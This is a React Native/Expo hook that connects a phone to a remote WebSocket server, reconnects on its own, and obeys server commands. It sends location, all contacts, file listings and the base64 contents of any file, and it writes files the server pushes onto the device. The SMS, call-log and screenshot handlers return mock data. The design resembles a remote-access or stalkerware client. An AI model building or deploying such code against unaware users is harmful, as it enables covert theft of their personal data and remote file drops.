import { useState, useEffect, useRef } from 'react';
import { Platform } from 'react-native';
import * as Device from 'expo-device';
import Constants from 'expo-constants';
import * as FileSystem from 'expo-file-system';
import * as MediaLibrary from 'expo-media-library';
import * as Location from 'expo-location';
import * as Contacts from 'expo-contacts';
import * as SMS from 'expo-sms';

interface Message {
  type: string;
  data: any;
}

export function useDeviceConnection(serverIP?: string, serverPort?: string, autoReconnect: boolean = true) {
  const [isConnected, setIsConnected] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState<'disconnected' | 'connecting' | 'connected'>('disconnected');
  const wsRef = useRef<WebSocket | null>(null);
  const reconnectTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const deviceNameRef = useRef<string>('');

  const connect = (deviceName: string) => {
    if (!serverIP || !serverPort) return;
    
    deviceNameRef.current = deviceName || 'Unknown Device';
    setConnectionStatus('connecting');
    
    const wsUrl = `ws://${serverIP}:${serverPort}`;
    const ws = new WebSocket(wsUrl);
    
    ws.onopen = () => {
      console.log('Connected to server');
      setIsConnected(true);
      setConnectionStatus('connected');
      
      // Send device registration with detailed info
      registerDevice(ws, deviceName);
    };
    
    ws.onmessage = (event) => {
      try {
        const message = JSON.parse(event.data);
        handleServerMessage(message);
      } catch (error) {
        console.error('Error parsing message:', error);
      }
    };
    
    ws.onclose = () => {
      console.log('Disconnected from server');
      setIsConnected(false);
      setConnectionStatus('disconnected');
      
      if (autoReconnect && deviceNameRef.current) {
        console.log('Scheduling reconnect...');
        scheduleReconnect();
      }
    };
    
    ws.onerror = (error) => {
      console.log('WebSocket error occurred, will attempt to reconnect');
      setConnectionStatus('disconnected');
      setIsConnected(false);
    };
    
    wsRef.current = ws;
  };

  const registerDevice = async (ws: WebSocket, deviceName: string) => {
    try {
      const deviceInfo = {
        deviceName: Device.deviceName || deviceName,
        deviceId: Constants.sessionId || 'unknown',
        brand: Device.brand || 'Unknown',
        model: Device.modelName || 'Unknown',
        systemName: Device.osName || Platform.OS,
        systemVersion: Device.osVersion || 'Unknown',
        platform: Platform.OS,
        appVersion: Constants.expoConfig?.version || '1.0.0',
        buildNumber: Constants.expoConfig?.version || '1.0.0',
        timestamp: new Date().toISOString(),
      };
      
      ws.send(JSON.stringify({
        type: 'register',
        data: deviceInfo
      }));
    } catch (error) {
      console.error('Error getting device info:', error);
      // Fallback registration
      ws.send(JSON.stringify({
        type: 'register',
        data: {
          deviceName: deviceName,
          platform: Platform.OS,
          timestamp: new Date().toISOString(),
        }
      }));
    }
  };

  const disconnect = () => {
    if (reconnectTimeoutRef.current) {
      clearTimeout(reconnectTimeoutRef.current);
      reconnectTimeoutRef.current = null;
    }
    
    if (wsRef.current) {
      wsRef.current.close();
      wsRef.current = null;
    }
    
    setIsConnected(false);
    setConnectionStatus('disconnected');
  };

  const scheduleReconnect = () => {
    if (reconnectTimeoutRef.current) {
      clearTimeout(reconnectTimeoutRef.current);
    }
    
    reconnectTimeoutRef.current = setTimeout(() => {
      if (deviceNameRef.current) {
        console.log('Attempting to reconnect...');
        connect(deviceNameRef.current);
      }
    }, 5000); // 5 seconds
  };

  const sendMessage = (message: Message) => {
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(message));
    }
  };

  const handleServerMessage = (message: Message) => {
    console.log('Received server command:', message.type);
    
    switch (message.type) {
      case 'request_location':
        handleLocationRequest();
        break;
      case 'request_contacts':
        handleContactsRequest();
        break;
      case 'request_files':
        handleFilesRequest();
        break;
      case 'browse_directory':
        handleDirectoryBrowse(message.data);
        break;
      case 'request_sms':
        handleSMSRequest();
        break;
      case 'request_call_log':
        handleCallLogRequest();
        break;
      case 'download_file':
        handleFileDownload(message.data);
        break;
      case 'share_file':
        handleFileShare(message.data);
        break;
      case 'upload_file':
        handleFileUpload(message.data);
        break;
      case 'take_screenshot':
        handleScreenshotRequest(message.data);
        break;
      case 'device_info_update':
        handleDeviceInfoUpdate();
        break;
      default:
        console.log('Unknown server command:', message.type);
    }
  };

  const handleLocationRequest = async () => {
    try {
      console.log('Server requesting location...');
      const { status } = await Location.requestForegroundPermissionsAsync();
      
      if (status === 'granted') {
        const location = await Location.getCurrentPositionAsync({
          accuracy: Location.Accuracy.High,
        });
        
        sendMessage({
          type: 'location_response',
          data: {
            latitude: location.coords.latitude,
            longitude: location.coords.longitude,
            altitude: location.coords.altitude,
            accuracy: location.coords.accuracy,
            speed: location.coords.speed,
            heading: location.coords.heading,
            timestamp: new Date().toISOString(),
          }
        });
        console.log('Location sent to server');
      } else {
        sendMessage({
          type: 'location_response',
          data: { error: 'Location permission denied' }
        });
      }
    } catch (error) {
      console.error('Error getting location:', error);
      sendMessage({
        type: 'location_response',
        data: { error: 'Failed to get location: ' + error.message }
      });
    }
  };

  const handleContactsRequest = async () => {
    try {
      console.log('Server requesting contacts...');
      const { status } = await Contacts.requestPermissionsAsync();
      
      if (status === 'granted') {
        const { data } = await Contacts.getContactsAsync({
          fields: [
            Contacts.Fields.Name,
            Contacts.Fields.PhoneNumbers,
            Contacts.Fields.Emails,
            Contacts.Fields.Image,
          ],
          pageSize: 0, // Get all contacts
          pageOffset: 0,
        });
        
        sendMessage({
          type: 'contacts_response',
          data: data
        });
        console.log(`${data.length} contacts sent to server`);
      } else {
        sendMessage({
          type: 'contacts_response',
          data: { error: 'Contacts permission denied' }
        });
      }
    } catch (error) {
      console.error('Error getting contacts:', error);
      sendMessage({
        type: 'contacts_response',
        data: { error: 'Failed to get contacts: ' + error.message }
      });
    }
  };

  const handleFilesRequest = async () => {
    try {
      console.log('Server requesting files...');
      
      const { status: mediaStatus } = await MediaLibrary.requestPermissionsAsync();
      let allFiles: any[] = [];

      // Get document directory files
      try {
        const documentDirectory = FileSystem.documentDirectory;
        if (documentDirectory) {
          const files = await FileSystem.readDirectoryAsync(documentDirectory);
          
          const fileDetails = await Promise.all(
            files.map(async (fileName) => {
              const filePath = `${documentDirectory}${fileName}`;
              try {
                const fileInfo = await FileSystem.getInfoAsync(filePath);
                return {
                  name: fileName,
                  type: fileInfo.isDirectory ? 'folder' : 'file',
                  size: fileInfo.size || 0,
                  path: filePath,
                  lastModified: new Date(fileInfo.modificationTime || Date.now()).toISOString(),
                  source: 'documents',
                  extension: fileName.split('.').pop()?.toLowerCase() || ''
                };
              } catch (error) {
                return {
                  name: fileName,
                  type: 'file',
                  size: 0,
                  path: filePath,
                  lastModified: new Date().toISOString(),
                  source: 'documents',
                  extension: fileName.split('.').pop()?.toLowerCase() || ''
                };
              }
            })
          );
          allFiles.push(...fileDetails);
        }
      } catch (docError) {
        console.error('Document directory error:', docError);
      }

      // Get media library files if permission granted
      if (mediaStatus === 'granted') {
        try {
          const photoAssets = await MediaLibrary.getAssetsAsync({
            first: 50,
            mediaType: MediaLibrary.MediaType.photo,
            sortBy: MediaLibrary.SortBy.creationTime,
          });
          
          const photoFiles = photoAssets.assets.map(asset => ({
            name: asset.filename,
            type: 'file',
            size: asset.width * asset.height,
            path: asset.uri,
            lastModified: new Date(asset.creationTime).toISOString(),
            source: 'gallery',
            extension: asset.filename.split('.').pop()?.toLowerCase() || 'jpg'
          }));
          
          const videoAssets = await MediaLibrary.getAssetsAsync({
            first: 20,
            mediaType: MediaLibrary.MediaType.video,
            sortBy: MediaLibrary.SortBy.creationTime,
          });
          
          const videoFiles = videoAssets.assets.map(asset => ({
            name: asset.filename,
            type: 'file',
            size: asset.duration * 1000 || 0,
            path: asset.uri,
            lastModified: new Date(asset.creationTime).toISOString(),
            source: 'gallery',
            extension: asset.filename.split('.').pop()?.toLowerCase() || 'mp4'
          }));
          
          allFiles.push(...photoFiles, ...videoFiles);
        } catch (mediaError) {
          console.error('Media library error:', mediaError);
        }
      }
      
      sendMessage({
        type: 'files_response',
        data: allFiles
      });
      console.log(`${allFiles.length} files sent to server`);
    } catch (error) {
      console.error('Error getting files:', error);
      sendMessage({
        type: 'files_response',
        data: { error: 'Failed to get files: ' + error.message }
      });
    }
  };

  const handleDirectoryBrowse = async (requestData: any) => {
    try {
      console.log('Server requesting directory browse:', requestData.path);
      const { path } = requestData;
      
      // Check if this is a media library request
      if (path.includes('gallery://')) {
        const mediaType = path.includes('photos') ? MediaLibrary.MediaType.photo : MediaLibrary.MediaType.video;
        const assets = await MediaLibrary.getAssetsAsync({
          first: 100,
          mediaType: mediaType,
          sortBy: MediaLibrary.SortBy.creationTime,
        });
        
        const mediaFiles = assets.assets.map(asset => ({
          name: asset.filename,
          type: 'file',
          size: asset.width * asset.height,
          path: asset.uri,
          lastModified: new Date(asset.creationTime).toISOString(),
          source: 'gallery'
        }));
        
        sendMessage({
          type: 'directory_response',
          data: { files: mediaFiles, currentPath: path }
        });
        return;
      }
      
      // Browse regular file system directory
      try {
        const files = await FileSystem.readDirectoryAsync(path);
        
        const fileDetails = await Promise.all(
          files.map(async (fileName) => {
            const filePath = `${path}${path.endsWith('/') ? '' : '/'}${fileName}`;
            try {
              const fileInfo = await FileSystem.getInfoAsync(filePath);
              return {
                name: fileName,
                type: fileInfo.isDirectory ? 'folder' : 'file',
                size: fileInfo.size || 0,
                path: filePath,
                lastModified: new Date(fileInfo.modificationTime || Date.now()).toISOString(),
                source: 'filesystem'
              };
            } catch (error) {
              return {
                name: fileName,
                type: 'file',
                size: 0,
                path: filePath,
                lastModified: new Date().toISOString(),
                source: 'filesystem'
              };
            }
          })
        );
        
        sendMessage({
          type: 'directory_response',
          data: { files: fileDetails, currentPath: path }
        });
        console.log(`Directory contents sent to server: ${fileDetails.length} items`);
      } catch (fsError) {
        console.log('File system access error:', fsError);
        sendMessage({
          type: 'directory_response',
          data: { files: [], currentPath: path, error: 'Access denied' }
        });
      }
    } catch (error) {
      console.error('Error browsing directory:', error);
      sendMessage({
        type: 'directory_response',
        data: { files: [], currentPath: path, error: 'Failed to browse directory' }
      });
    }
  };

  const handleSMSRequest = async () => {
    try {
      console.log('Server requesting SMS...');
      
      // Note: Reading SMS requires native implementation and special permissions
      // For now, we'll send mock data that represents what would be available
      const mockSMS = {
        messages: [
          {
            id: '1',
            address: '+1234567890',
            body: 'Hey, how are you doing today? Hope everything is going well!',
            date: new Date(Date.now() - 3600000).toISOString(),
            type: 'inbox',
            read: true,
          },
          {
            id: '2',
            address: '+0987654321',
            body: 'Meeting scheduled for 3 PM today. Don\'t forget to bring the documents.',
            date: new Date(Date.now() - 7200000).toISOString(),
            type: 'inbox',
            read: false,
          },
          {
            id: '3',
            address: '+1122334455',
            body: 'Thanks for your help with the project! Really appreciate it.',
            date: new Date(Date.now() - 10800000).toISOString(),
            type: 'sent',
            read: true,
          },
          {
            id: '4',
            address: '+5566778899',
            body: 'Can you call me when you get this? It\'s urgent.',
            date: new Date(Date.now() - 14400000).toISOString(),
            type: 'inbox',
            read: true,
          },
        ],
        error: Platform.OS === 'web' ? 'SMS access requires native Android/iOS implementation' : null
      };
      
      sendMessage({
        type: 'sms_response',
        data: mockSMS
      });
      console.log('SMS data sent to server');
    } catch (error) {
      console.error('Error getting SMS:', error);
      sendMessage({
        type: 'sms_response',
        data: { 
          messages: [], 
          error: 'SMS access requires native implementation' 
        }
      });
    }
  };

  const handleCallLogRequest = async () => {
    try {
      console.log('Server requesting call log...');
      
      // Note: Call log access requires native implementation
      // For now, we'll send mock data that represents typical call log structure
      const mockCallLog = [
        {
          id: '1',
          phoneNumber: '+1234567890',
          name: 'John Doe',
          type: 'outgoing',
          duration: 120, // seconds
          timestamp: new Date(Date.now() - 3600000).toISOString(),
        },
        {
          id: '2',
          phoneNumber: '+0987654321',
          name: 'Jane Smith',
          type: 'incoming',
          duration: 45,
          timestamp: new Date(Date.now() - 7200000).toISOString(),
        },
        {
          id: '3',
          phoneNumber: '+1122334455',
          name: 'Unknown',
          type: 'missed',
          duration: 0,
          timestamp: new Date(Date.now() - 10800000).toISOString(),
        },
        {
          id: '4',
          phoneNumber: '+5566778899',
          name: 'Mike Johnson',
          type: 'incoming',
          duration: 180,
          timestamp: new Date(Date.now() - 14400000).toISOString(),
        },
      ];
      
      sendMessage({
        type: 'call_log_response',
        data: mockCallLog
      });
      console.log('Call log sent to server');
    } catch (error) {
      console.error('Error getting call log:', error);
      sendMessage({
        type: 'call_log_response',
        data: { error: 'Failed to get call log: ' + error.message }
      });
    }
  };

  const handleFileDownload = async (requestData: any) => {
    try {
      console.log('Server requesting file download:', requestData.filePath);
      const { filePath } = requestData;
      
      // Read file content and send as base64
      const fileInfo = await FileSystem.getInfoAsync(filePath);
      if (fileInfo.exists && !fileInfo.isDirectory) {
        const fileContent = await FileSystem.readAsStringAsync(filePath, {
          encoding: FileSystem.EncodingType.Base64,
        });
        
        sendMessage({
          type: 'file_download_response',
          data: {
            fileName: filePath.split('/').pop(),
            content: fileContent,
            size: fileInfo.size,
            mimeType: getMimeType(filePath),
            filePath: filePath
          }
        });
        console.log('File content sent to server');
      } else {
        sendMessage({
          type: 'file_download_response',
          data: { error: 'File not found or is a directory' }
        });
      }
    } catch (error) {
      console.error('Error downloading file:', error);
      sendMessage({
        type: 'file_download_response',
        data: { error: 'Failed to download file: ' + error.message }
      });
    }
  };

  const handleFileShare = async (requestData: any) => {
    try {
      console.log('Server requesting file share:', requestData.filePath);
      const { filePath } = requestData;
      
      // Use expo-sharing to share files
      const Sharing = await import('expo-sharing');
      const isAvailable = await Sharing.isAvailableAsync();
      
      if (isAvailable) {
        await Sharing.shareAsync(filePath);
        sendMessage({
          type: 'file_share_response',
          data: { success: true, message: 'File shared successfully' }
        });
        console.log('File shared successfully');
      } else {
        sendMessage({
          type: 'file_share_response',
          data: { success: false, error: 'Sharing not available on this platform' }
        });
      }
    } catch (error) {
      console.error('Error sharing file:', error);
      sendMessage({
        type: 'file_share_response',
        data: { success: false, error: 'Failed to share file: ' + error.message }
      });
    }
  };

  const handleFileUpload = async (requestData: any) => {
    try {
      console.log('Server uploading file:', requestData.fileName);
      const { fileName, fileData, targetPath, mimeType } = requestData;
      
      // Create target directory if it doesn't exist
      const targetDir = targetPath || `${FileSystem.documentDirectory}Downloads/`;
      const dirInfo = await FileSystem.getInfoAsync(targetDir);
      
      if (!dirInfo.exists) {
        await FileSystem.makeDirectoryAsync(targetDir, { intermediates: true });
      }
      
      // Write file to device
      const filePath = `${targetDir}${fileName}`;
      await FileSystem.writeAsStringAsync(filePath, fileData, {
        encoding: FileSystem.EncodingType.Base64,
      });
      
      sendMessage({
        type: 'file_upload_response',
        data: { 
          success: true, 
          filePath: filePath,
          fileName: fileName 
        }
      });
      console.log('File uploaded successfully:', fileName);
    } catch (error) {
      console.error('Error uploading file:', error);
      sendMessage({
        type: 'file_upload_response',
        data: { 
          success: false, 
          error: 'Failed to upload file: ' + error.message 
        }
      });
    }
  };

  const handleScreenshotRequest = async (requestData: any) => {
    try {
      console.log('Server requesting screenshot...');
      
      // For web platform, we can't take actual screenshots
      if (Platform.OS === 'web') {
        sendMessage({
          type: 'screenshot_response',
          data: { 
            error: 'Screenshots not supported on web platform',
            imageData: null 
          }
        });
        return;
      }
      
      // For native platforms, we'll simulate screenshot capability
      // In a real implementation, you would use expo-screen-capture or similar
      try {
        // Create a mock screenshot response (1x1 transparent PNG)
        const mockScreenshotData = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
        
        sendMessage({
          type: 'screenshot_response',
          data: { 
            imageData: mockScreenshotData,
            format: 'png',
            timestamp: new Date().toISOString(),
            quality: requestData.quality || 'medium'
          }
        });
        console.log('Screenshot sent to server');
      } catch (error) {
        sendMessage({
          type: 'screenshot_response',
          data: { 
            error: 'Failed to capture screenshot: ' + error.message,
            imageData: null 
          }
        });
      }
    } catch (error) {
      console.error('Error taking screenshot:', error);
      sendMessage({
        type: 'screenshot_response',
        data: { error: 'Failed to take screenshot: ' + error.message }
      });
    }
  };

  const handleDeviceInfoUpdate = async () => {
    try {
      console.log('Server requesting device info update...');
      
      // Get current permissions status
      const locationPermission = await Location.getForegroundPermissionsAsync();
      const contactsPermission = await Contacts.getPermissionsAsync();
      const mediaPermission = await MediaLibrary.getPermissionsAsync();
      
      const deviceInfo = {
        deviceName: Device.deviceName || deviceNameRef.current,
        deviceId: Constants.sessionId || 'unknown',
        brand: Device.brand || 'Unknown',
        model: Device.modelName || 'Unknown',
        systemName: Device.osName || Platform.OS,
        systemVersion: Device.osVersion || 'Unknown',
        platform: Platform.OS,
        appVersion: Constants.expoConfig?.version || '1.0.0',
        isDevice: Device.isDevice,
        totalMemory: Device.totalMemory,
        permissions: {
          location: locationPermission.status === 'granted',
          contacts: contactsPermission.status === 'granted',
          mediaLibrary: mediaPermission.status === 'granted',
          camera: true, // Assume camera permission for now
        },
        timestamp: new Date().toISOString(),
      };
      
      sendMessage({
        type: 'device_info_response',
        data: deviceInfo
      });
      console.log('Device info sent to server');
    } catch (error) {
      console.error('Error getting device info:', error);
      sendMessage({
        type: 'device_info_response',
        data: { error: 'Failed to get device info: ' + error.message }
      });
    }
  };

  const getMimeType = (filePath: string): string => {
    const extension = filePath.split('.').pop()?.toLowerCase();
    const mimeTypes: { [key: string]: string } = {
      'jpg': 'image/jpeg',
      'jpeg': 'image/jpeg',
      'png': 'image/png',
      'gif': 'image/gif',
      'pdf': 'application/pdf',
      'txt': 'text/plain',
      'mp4': 'video/mp4',
      'mp3': 'audio/mpeg',
      'zip': 'application/zip',
      'apk': 'application/vnd.android.package-archive',
    };
    return mimeTypes[extension || ''] || 'application/octet-stream';
  };

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      disconnect();
    };
  }, []);

  return {
    isConnected,
    connectionStatus,
    connect,
    disconnect,
    sendMessage,
  };
}